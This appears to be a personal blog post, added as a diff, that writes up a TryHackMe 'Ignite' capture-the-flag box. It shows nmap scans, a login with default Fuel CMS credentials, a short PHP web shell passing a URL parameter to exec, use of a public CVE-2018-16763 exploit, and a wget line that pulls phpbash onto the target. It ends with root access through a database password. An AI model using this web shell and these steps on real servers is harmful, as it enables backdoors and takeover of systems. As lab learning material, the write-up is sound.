@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Leo Smith's website, specialized in cyber security research, programming and audit. This website also contains my personal cyber security write ups and tools.">
+  <meta name="author" content="Leo Smith">
+
+  <title>Leo Smith - Ignite</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Custom fonts for this theme -->
+  <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+
+  <!-- Theme CSS -->
+  <link href="../css/freelancer.css" rel="stylesheet">
+  <link href="../css/blog-post.css" rel="stylesheet">
+  <link rel="shortcut icon" type="image/png" href="../img/favicon.png"/>
+  <!-- Custom styles for this template -->
+
+</head>
+
+<body id="page-top">
+
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand js-scroll-trigger" href="#page-top">Leo Smith</a>
+      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/index.html">Home</a>
+          </li>
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/index.html#config">Config</a>
+          </li>
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/index.html#writeups">Write-Ups</a>
+          </li>
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/index.html#projects">Projects</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Content -->
+  <div class="container post">
+
+    <div class="row">
+
+      <!-- Post Content Column -->
+      <div class="col-lg-8">
+
+        <!-- Title -->
+        <h1 class="mt-4">Ignite - How I just need to git gud</h1>
+
+        <!-- Author -->
+        <p class="lead">
+          by Leo Smith /
+          <a href="https://github.com/p4p1">p4p1</a>
+        </p>
+
+        <hr>
+
+        <!-- Date/Time -->
+        <p>
+          Created on: Sat. 18 april 2020 05:22:43  CEST
+        </p>
+
+        <hr>
+
+        <!-- Preview Image -->
+        <img class="img-fluid rounded" src="https://tryhackme-images.s3.amazonaws.com/room-icons/676cb3273c613c9ba00688162efc0979.png" alt="">
+
+        <hr>
+
+        <!-- Post Content -->
+        <p class="lead">
+          So this is very experimental for me, I am not very good at cyber security yet
+          but I'm working hard to be so this post is dedicated to that :) so let's
+          get to it!...
+        </p>
+
+        <p id="research">
+          I started by scanning the living shit out of this box. It's the first time
+          I'm going blind on a box without any prior knowledge of what I'm up against
+          so it's hard for me to get a grip on things, more on that later :)
+        </p>
+        <pre>
+          <code class="prettyprint">
+            nmap x.x.x.x
+
+            Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-17 21:38 CEST
+            Nmap scan report for 10.10.236.138
+            Host is up (0.024s latency).
+            Not shown: 970 closed ports, 29 filtered ports
+            PORT   STATE SERVICE
+            80/tcp open  http
+
+            Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
+
+            sudo nmap -O -sV --script vuln x.x.x.x
+
+            Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-17 21:39 CEST
+            Pre-scan script results:
+            | broadcast-avahi-dos:
+            |   Discovered hosts:
+            |     224.0.0.251
+            |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+            |_  Hosts are all up (not vulnerable).
+            Nmap scan report for 10.10.236.138
+            Host is up (0.061s latency).
+            Not shown: 999 closed ports
+            PORT   STATE SERVICE VERSION
+            80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+            |_http-csrf: Couldn\t find any CSRF vulnerabilities.
+            |_http-dombased-xss: Couldn\t find any DOM based XSS.
+            | http-enum:
+            |   /robots.txt: Robots file
+            |   /0/: Potentially interesting folder
+            |   /home/: Potentially interesting folder
+            |_  /index/: Potentially interesting folder
+            |_http-server-header: Apache/2.4.18 (Ubuntu)
+            |_http-stored-xss: Couldn\t find any stored XSS vulnerabilities.
+            No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+            TCP/IP fingerprint:
+            OS:SCAN(V=7.60%E=4%D=4/17%OT=80%CT=1%CU=30000%PV=Y%DS=2%DC=I%G=Y%TM=5E9A07A
+            OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)SEQ
+            OS:(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
+            OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=68DF%W2=
+            OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M54DNNSN
+            OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+            OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+            OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+            OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+            OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+            Network Distance: 2 hops
+
+            OS and Service detection performed. Please report any incorrect result
+            s at https://nmap.org/submit/ .
+            Nmap done: 1 IP address (1 host up) scanned in 457.59 seconds
+
+          </code>
+        </pre>
+        <p>
+          While those scan where running, I visited the page on my browser to see
+          if it had a web app running.
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/web_page_image.png" alt="">
+        <p></p>
+        <p id="vuln">
+          Looking at this page thinking to myself wtf is this, I start researching
+          fuel CMS and what it's for. I then figure out it's some kind of WordPress
+          like web app. Looking a bit deeper in the project I understand it's running
+          CodeIgniter a PHP5 framework. Knowing this there probably is an exploit
+          out there for this. Going through exploit-db I find the
+          <a href="https://www.exploit-db.com/exploits/47138">CVE-2018-16763</a>
+          exploit. Knowing from the code and the title of the attack it's a remote
+          code execution one.
+        </p>
+        <p>
+          After figuring this out I go back to my nmap scans and see that they
+          are finished I find the version of apache they are using and some useful
+          links provided by the nmap script. I start looking around the first page
+          and seeing some cool information I could use I write down the different
+          links from the page and at the bottom I find default login credentials.
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/admin_user_pass.png" alt="">
+        <p></p>
+        <p>
+          When I saw this my brain finally clicked the user didn't set anything up
+          this is a default installation of Fuel CMS. I then decided to inspect the
+          robots.txt file:
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/robots.png" alt="">
+        <p></p>
+        <p>
+          And to my big surprise I find a path for the fuel page. I then visit it
+          and put the admin credentials in
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/admin_dashboard.png" alt="">
+        <p></p>
+        <p>
+          Cool I found an entry point to the Fuel CMS :) without thinking further,
+          (BIG NO NO!) I start thinking to myself "Oh shit! I'm gonna upload some
+          php backdoor" so I roll out a simple php script that I use for that:
+        </p>
+        <pre>
+          <code class="prettyprint">
+            &lt;?php
+            if (isset($_GET["cmd"])) {
+              echo exec($_GET["cmd"]);
+            }
+            phpinfo();
+            ?&gt;
+          </code>
+        </pre>
+        <p>
+          But it didn't work, uploading a file on the server got me this error:
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/fuelcmsuploaderror.png" alt="">
+        <p></p>
+        <p>
+          At that point I was confused as hell, my file was four fucking lines, how can
+          it be too big?! But whatever I kept going and finally found a way to upload it
+          by setting a few variables in the main dashboard of the server. Now trying to
+          visit the page was an other story, when I visited it I got error 404 now that
+          part is so confusing for me because on the admin panel it was there... Why?!?!?
+          But OK so after doing a bit of research on the room I find out that I should
+          probably be using the exploit I found on exploit-db instead of creating my own. LOL.
+        </p>
+        <p>
+          So after that I run the script by swapping a few values around and removing
+          their proxy settings inside of it, bang! I get a sweet shell.
+        </p>
+        <pre>
+          <code class="prettyprint">
+            cmd: whoami
+            systemwww-data
+
+            cmd: pwd
+            /var/www/html
+          </code>
+        </pre>
+        <p>
+          Now I am not sharing a screenshot of my terminal because the script would
+          print error messaged between each output, no clue why but who cares? It works :)
+          Looking back at the write-up thinking this shell is terribly shit I see
+          that this bloke uses
+          <a href="https://github.com/Arrexel/phpbash/blob/master/phpbash.php">phpbash.php</a>
+          what a genius so I download the php file put it on a web server and then run
+          a wget on the box to download the script.
+        </p>
+        <pre>
+          <code class="prettyprint">
+            wget http://x.x.x.x:8080/phpbash.php
+          </code>
+        </pre>
+        <p>
+          I then try to visit the page and yup it work's better than my shady script.
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/php_bash_shell.png" alt="">
+        <p></p>
+        <p id="flag1">
+          I then look around for a bit on that shell and think "wait, the second
+          flag name is root.txt I need to be root!" so instead of looking for the
+          first flag I start trying to do some privesc, so I type sudo -l in the
+          terminal and realize that I need a tty so I wonder if I could just do
+          a reverse ssh shell to my machine and go from there and after 100
+          failed tries I give up and go to the home directory of the user and find
+          the first flag :) cool. Now that was done I decided to go back to messing
+          around with tty's.
+        </p>
+        <p id="privesc">
+          After a few hours I go nut's why the hell can't I figure this thing out
+          at that point I'm also starving to death (not the best of ideas LOL)
+          so I look back at the write-up I was on before and I see that he manages
+          to do it. So I was on the right track but I just didn't know how to do
+          it. So after some hard understanding (copy-paste) I manage to get some
+          progress
+        </p>
+        <p>
+          Now in the tty session I start going through all of the files on the
+          system looking for some privescs but looking back at my research phase
+          I see all of the config links I wrote down. I see a MY_config one but
+          nothing there, even the config.php is useless. Bloody hell at that point
+          I feel like I'm just waisting my time reading wierd ass config files
+          and then, the light, I display the content of the database config and
+          I see something beautiful!
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/admin_password.png" alt="">
+        <p></p>
+        <p id="flag2">
+          So yeah hallelujah!! the root password! I then login the root user via
+          the shell previously set up and yeah I finally finished this room.
+        </p>
+        <img class="img-fluid rounded" src="img/ignite/ttysol.png" alt="">
+        <p></p>
+
+        <hr>
+
+        <p id="stink">
+          Now looking back at this experience. There are a few sticking points I
+          need to address so that I can progress faster. I need to look a lot
+          deeper on how different stuff works. Spend a bit more time researching
+          and trying to understand more about the services that are running out
+          there. I also need to take my time a lot more and really relax while I
+          do this. For me this is the hardest part I think because I am so used
+          to being really efficient when I code for example. It's hard to take a
+          step back and really take my time. I also need to work more on tty's
+          and reverse shell's. I did write in C a reverse shell but it was very
+          basic. I am also really interested on how they work. I also need a more
+          organized approach at pentesting I am really all over the place when I
+          pentest so I need to find a better approach. I think I will acquire most
+          of those points with time. I am still learning anyway :)
+        </p>
+
+        <p>
+          As usual, thank you for reading! Follow me on github and share the page
+          to other pentesters so they can have a laugh ;)
+        </p>
+
+        <hr>
+      </div>
+
+      <!-- Sidebar Widgets Column -->
+      <div class="col-md-4">
+
+        <!-- Categories Widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Different sections:</h5>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-lg-6">
+                <ul class="list-unstyled mb-0">
+                  <li>
+                    <a href="#research">research</a>
+                  </li>
+                  <li>
+                    <a href="#vuln">Vulnerabilities</a>
+                  </li>
+                  <li>
+                    <a href="#flag1">flag01.txt</a>
+                  </li>
+                  <li>
+                    <a href="#privesc">Privesc</a>
+                  </li>
+                  <li>
+                    <a href="#flag2">flag02.txt</a>
+                  </li>
+                  <li>
+                    <a href="#stink">My sticking points</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Dark mode Widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Dark Mode</h5>
+          <div class="card-body">
+            <label class="switch">
+              <input type="checkbox" id="toggleshade" onclick="shade();shade2();">
+              <span class="slider round"></span>
+            </label>
+          </div>
+        </div>
+        <!-- Share widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Share</h5>
+          <div class="card-body">
+            <!-- AddToAny BEGIN -->
+            <div class="a2a_kit a2a_kit_size_32 a2a_default_style center">
+              <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+              <a class="a2a_button_google_gmail"></a>
+              <a class="a2a_button_facebook"></a>
+              <a class="a2a_button_twitter"></a>
+              <a class="a2a_button_reddit"></a>
+            </div>
+            <script async src="https://static.addtoany.com/menu/page.js"></script>
+            <!-- AddToAny END -->
+          </div>
+        </div>
+
+        <!-- Categories Widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Usefull links:</h5>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-lg-6">
+                <ul class="list-unstyled mb-0">
+                  <li>
+                    <a href="https://tryhackme.com/room/ignite">Challenge</a>
+                  </li>
+                  <li>
+                    <a href="#">Write-up in Markdown Format</a>
+                  </li>
+                  <li>
+                    <a href="#">Write-up I used to help me</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+    <!-- /.row -->
+
+  </div>
+  <!-- /.container -->
+
+  <!-- Footer -->
+  <footer class="footer text-center">
+    <div class="container">
+      <div class="row">
+
+        <div class="col-lg-4 mb-5 mb-lg-0">
+          <h4 class="text-uppercase mb-4">Share</h4>
+          <!-- AddToAny BEGIN -->
+          <div class="a2a_kit a2a_kit_size_32 a2a_default_style center">
+            <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+            <a class="a2a_button_google_gmail"></a>
+            <a class="a2a_button_facebook"></a>
+            <a class="a2a_button_twitter"></a>
+            <a class="a2a_button_reddit"></a>
+          </div>
+          <script async src="https://static.addtoany.com/menu/page.js"></script>
+          <!-- AddToAny END -->
+        </div>
+
+        <div class="col-lg-4 mb-5 mb-lg-0">
+          <h4 class="text-uppercase mb-4">About this page</h4>
+          <p class="lead mb-0">Template found <a target="_blank" rel="noopener noreferrer" href="https://startbootstrap.com/themes/freelancer/">here</a>.</p>
+        </div>
+
+        <div class="col-lg-4 mb-5 mb-lg-0">
+          <h4 class="text-uppercase mb-4">Follow me</h4>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://www.linkedin.com/in/leo-smith-1bab2a156/">
+            <i class="fab fa-fw fa-linkedin-in"></i>
+          </a>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://github.com/p4p1">
+            <i class="fab fa-github"></i>
+          </a>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://linuxsecurity.expert/p/leo-smith">
+              <i class="fab fa-linux"></i>
+          </a>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://tryhackme.com/p/p4p1">
+              <i class="fas fa-flag-checkered"></i>
+          </a>
+        </div>
+
+      </div>
+    </div>
+  </footer>
+  <!-- Copyright Section-->
+  <section class="copyright py-4 text-center text-white">
+    <div class="container"><small>Copyright © Leo Smith 2020</small></div>
+  </section>
+  <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) -->
+  <div class="scroll-to-top d-lg-none position-fixed ">
+    <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="../vendor/jquery/jquery.min.js"></script>
+  <script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Plugin JavaScript -->
+  <script src="../vendor/jquery-easing/jquery.easing.min.js"></script>
+
+  <!-- Contact Form JavaScript -->
+  <script src="../js/jqBootstrapValidation.js"></script>
+  <script src="../js/contact_me.js"></script>
+
+  <!-- Custom scripts for this template -->
+  <script src="../js/freelancer.min.js"></script>
+  <script src="../js/hidden.js"></script>
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163484307-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-163484307-1');
+  </script>
+
+  <script>
+    var card = document.getElementsByClassName("card");
+    var h4Elements = document.getElementsByTagName("h4");
+    var dark2=getDarkcookie();
+    document.addEventListener('keypress', logKey2);
+    if (dark2 == 1) {
+      for (var i = 0; i < card.length; i++) {
+        card[i].style.backgroundColor = "#423d3d";
+      }
+    }
+    function logKey2(e) {
+      if (e.key === 'b') {
+        if (dark2 == 0) {
+          document.getElementById("toggleshade").checked = true;
+          document.cookie = "dark=1";
+          for (var i = 0; i < card.length; i++) {
+            card[i].style.backgroundColor = "#423d3d";
+          }
+          for(var i = 0; i < h4Elements.length; i++) {
+               h4Elements[i].style.color = "#fff";
+          }
+          dark2 = 1;
+        } else {
+          document.getElementById("toggleshade").checked = false;
+          document.cookie = "dark=0";
+          document.body.style.color = "#000"
+          for (var i = 0; i < card.length; i++) {
+            card[i].style.backgroundColor = "#FFF";
+          }
+          for(var i = 0; i < h4Elements.length; i++) {
+               h4Elements[i].style.color = "#fff";
+          }
+          dark2 = 0;
+        }
+      }
+    }
+    function shade2() {
+      if (dark2 == 0) {
+        document.getElementById("toggleshade").checked = true;
+        document.cookie = "dark=1";
+        for (var i = 0; i < card.length; i++) {
+          card[i].style.backgroundColor = "#423d3d";
+        }
+        for(var i = 0; i < h4Elements.length; i++) {
+             h4Elements[i].style.color = "#fff";
+        }
+        dark2 = 1;
+      } else {
+        document.getElementById("toggleshade").checked = false;
+        document.cookie = "dark=0";
+        document.body.style.color = "#000"
+        for (var i = 0; i < card.length; i++) {
+          card[i].style.backgroundColor = "#FFF";
+        }
+        for(var i = 0; i < h4Elements.length; i++) {
+             h4Elements[i].style.color = "#fff";
+        }
+        dark2 = 0;
+      }
+    }
+  </script>
+  <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
+
+</body>
+
+</html>
